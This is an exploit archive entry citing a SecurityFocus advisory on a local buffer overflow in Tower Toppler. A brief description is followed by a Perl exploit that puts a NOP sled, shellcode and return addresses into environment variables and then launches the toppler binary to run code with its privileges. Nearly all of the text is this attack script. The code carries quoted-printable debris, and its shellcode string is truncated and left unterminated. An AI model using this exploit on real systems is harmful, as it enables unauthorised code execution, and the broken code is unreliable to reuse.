source: http://www.securityfocus.com/bid/7028/info

It has been reported that a buffer overflow exists in Tower Toppler. A local user may be able to exploit this issue to execute code with the privileges of the toppler program.

#!/usr/bin/perl
#kokanin@dtors.net playing a game
#hi bob
$len = 1024;
$ret = 0xbfbffd31;
$nop = "\x90";
$offset = 0;
$shellcode = =
"\x31\xc9\xf7\xe1\x51\x41\x51\x41\x51\x51\xb0\x61\xcd\x80\x89\xc3\x68\xD9\x9d;

if (@ARGV == 1) {
    $offset = $ARGV[0];
}
 =20
for ($i = 0; $i < ($len - length($shellcode) - 100); $i++) {
    $buffer .= $nop;
}
=20
$buffer .= $shellcode;

$new_ret = pack('l', ($ret + $offset));
=20
for ($i += length($shellcode); $i < $len; $i += 4) {
    $buffer .= $new_ret;
}

local($ENV{'EGG'}) = $buffer;=20
local($ENV{'DISPLAY'}) = $new_ret x 64;=20

exec("toppler 2>/dev/null");